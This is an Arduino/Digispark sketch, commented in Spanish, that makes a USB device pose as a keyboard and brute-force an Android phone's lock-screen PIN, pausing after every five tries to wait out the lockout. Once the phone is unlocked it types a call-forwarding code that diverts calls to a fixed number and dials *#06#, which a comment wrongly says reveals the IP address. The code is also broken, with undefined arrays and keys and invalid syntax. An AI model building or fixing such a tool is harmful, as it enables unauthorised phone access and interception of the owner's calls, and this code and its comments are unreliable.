#include "DigiKeyboard.h"

#define USB_HID_KEYS


//DEFINIMOS NUESTRAS VARIABLES PARA EL TECLADO
#define KEY_NONE 0x00 // No key pressed
#define KEY_ERR_OVF 0x01 //  Keyboard Error Roll Over - used for all slots if too many keys are pressed ("Phantom key")
#define KEY_A 0x04 // Keyboard a and A
#define KEY_B 0x05 // Keyboard b and B
#define KEY_C 0x06 // Keyboard c and C
#define KEY_D 0x07 // Keyboard d and D
#define KEY_E 0x08 // Keyboard e and E
#define KEY_F 0x09 // Keyboard f and F
#define KEY_G 0x0a // Keyboard g and G
#define KEY_H 0x0b // Keyboard h and H
#define KEY_I 0x0c // Keyboard i and I
#define KEY_J 0x0d // Keyboard j and J
#define KEY_K 0x0e // Keyboard k and K
#define KEY_L 0x0f // Keyboard l and L
#define KEY_M 0x10 // Keyboard m and M
#define KEY_N 0x11 // Keyboard n and N
#define KEY_O 0x12 // Keyboard o and O
#define KEY_P 0x13 // Keyboard p and P
#define KEY_Q 0x14 // Keyboard q and Q
#define KEY_R 0x15 // Keyboard r and R
#define KEY_S 0x16 // Keyboard s and S
#define KEY_T 0x17 // Keyboard t and T
#define KEY_U 0x18 // Keyboard u and U
#define KEY_V 0x19 // Keyboard v and V
#define KEY_W 0x1a // Keyboard w and W
#define KEY_X 0x1b // Keyboard x and X
#define KEY_Y 0x1c // Keyboard y and Y
#define KEY_Z 0x1d // Keyboard z and Z

#define KEY_ENTER 0x28 // Keyboard Return (ENTER)
#define KEY_HOME 0x4a // Keyboard Home


//DECLARAMOS NUESTROS NUMEROS A PROBAR PARA EL DESBLOQUEO
int n1 = 0; //1st digit
int n2 = 0; //2nd digit
int n3 = 0; //3rd digit
int n4 = 0; //4th digit
int n5 = 0; //5th digit
int count = 0;
bool key_stroke_e = false;

void setup() {
  DigiKeyboard.update();
  //evitamos perder el primer caracter debido a que android 11 no reconoce directamente
  DigiKeyboard.sendKeyStroke(0);
  delay(3000);
}

void loop() {
  //Empezamos con los intentos
  //Despues de 5 intentos realizados damos un delay de 31 segundos por el bloqueo que tienen los telefonos
  if(count == 5){
    digitalWrite(1,HIGH); 
    //presionamos enter para pasar del login
    DigiKeyboard.sendKeyStroke(40); 
    delay(31000);
    count = 0;
    digitalWrite(1,LOW);
  }
  //Verificamos si nuestro pin es de 5 digitos si es asi empezamos con la escritura
  if (key_stroke_e == true){
    DigiKeyboard.sendKeyStroke(num[n1]);
    DigiKeyboard.sendKeyStroke(num[n2]);
    DigiKeyboard.sendKeyStroke(num[n3]);
    DigiKeyboard.sendKeyStroke(num[n4]);
    DigiKeyboard.sendKeyStroke(num[n5]);
  }
  //Empezamos con la escritura de los valores de cada uno de 0 y 9
  if (key_stroke_e == false)
    DigiKeyboard.sendKeyStroke(num[n1]);
    DigiKeyboard.sendKeyStroke(num[n2]);
    DigiKeyboard.sendKeyStroke(num[n3]);
    DigiKeyboard.sendKeyStroke(num[n4]);
  
  DigiKeyboard.sendKeyStroke(40);
  delay(1000);
  n4++;
  count++;


  //UNA VEZ DESBLOQUEADO EL TELEFONO
  if(count == 2){
  DigiKeyboard.println([KEY_TAB]);
  DigiKeyboard.println([KEY_TAB]);
  DigiKeyboard.sendKeyStroke(40); 
  delay(1000);
  //DESVIAMOS LAS LLAMADAS
  DigiKeyboard.println("**21*76587841#");
  DigiKeyboard.sendKeyStroke(40); 
  //SACAMOS LA IP DEL TELEFONO
  DigiKeyboard.println("*#06#");
  }
  
}
